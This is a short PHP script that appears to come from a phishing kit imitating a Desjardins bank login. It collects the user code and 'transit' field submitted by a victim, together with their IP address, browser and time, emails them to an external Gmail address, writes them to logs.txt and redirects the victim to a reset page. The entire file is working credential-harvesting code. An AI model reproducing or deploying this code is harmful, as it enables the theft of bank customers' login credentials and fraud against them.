<?php
$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");
$cc = $_POST['codeUtilisateur'];
$pp = $_POST['transit'];
$data ="
=============## DESJ ##==================
|USER : $cc
============## Goodies ##=======================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##DEJ #$browserAgent";

$emailusr = 'results1113@gmail.com';

mail($emailusr, $subj, $data);

 $fp = fopen("logs.txt", "a");
 //write to the file
 fwrite($fp, $data);
 fclose($fp);

header("Location: ./reset.php");

?>